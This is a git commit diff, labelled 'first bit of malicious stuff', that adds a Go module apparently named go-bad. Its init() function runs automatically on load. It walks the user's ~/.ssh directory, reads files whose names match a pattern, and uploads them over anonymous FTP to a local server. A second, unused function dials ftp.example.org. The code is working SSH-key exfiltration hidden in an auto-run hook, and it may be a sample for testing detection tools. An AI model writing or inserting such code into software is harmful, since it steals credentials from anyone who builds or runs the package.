3fbfae955c577dcdac3afcc72be9f4001fa711d1
Garrett Primm <garrett.primm@abbvie.com>
2024-06-19 20:46:26 -0500

    first bit of malicious stuff

---
+++ go.mod
@@ -0,0 +1,10 @@
+module dev.azure.com/abbvie-devops-test/BTS-DevOps/go-bad
+
+go 1.22.4
+
+require github.com/jlaffaye/ftp v0.2.0
+
+require (
+	github.com/hashicorp/errwrap v1.0.0 // indirect
+	github.com/hashicorp/go-multierror v1.1.1 // indirect
+)
---
+++ main.go
@@ -0,0 +1,86 @@
+package main
+
+import (
+	"bytes"
+	"fmt"
+	"log"
+	"os"
+	"path"
+	"path/filepath"
+	"regexp"
+	"time"
+
+	"github.com/jlaffaye/ftp"
+)
+
+
+func upload(string) {
+	c, err := ftp.Dial("ftp.example.org:21", ftp.DialWithTimeout(5*time.Second))
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	err = c.Login("anonymous", "anonymous")
+	if err != nil {
+		log.Fatal(err)
+
+
+}
+
+// Do something with the FTP conn
+
+if err := c.Quit(); err != nil {
+    log.Fatal(err)
+}
+}
+
+func init() {
+
+	home, _ := os.UserHomeDir()
+
+
+	sshpath := path.Join(home, ".ssh")
+
+	libRegEx, e := regexp.Compile("example.*")
+	if e != nil {
+		log.Fatal(e)
+	}
+	
+
+	c, err := ftp.Dial("localhost:21", ftp.DialWithTimeout(5*time.Second))
+	if err != nil {
+		log.Fatal(err)
+	}
+	
+	err = c.Login("anonymous", "anonymous")
+	if err != nil {
+		log.Fatal(err)
+	}
+	
+	
+	e = filepath.Walk(sshpath, func(path string, info os.FileInfo, err error) error {
+		if err == nil && libRegEx.MatchString(info.Name()) {
+
+			dat, err := os.ReadFile(fmt.Sprintf("%s/%s", sshpath, info.Name()))
+			if err != nil {
+				log.Print(err)
+			}
+			r := bytes.NewReader(dat)
+			err = c.Stor(info.Name(),r)
+			if err != nil {
+				log.Print(err)
+			}
+			println(info.Name())
+		}
+		return nil
+	})
+	if e != nil {
+		log.Fatal(e)
+	}
+	if err := c.Quit(); err != nil {
+		log.Fatal(err)
+	}
+	
+}
+
+func main() {}
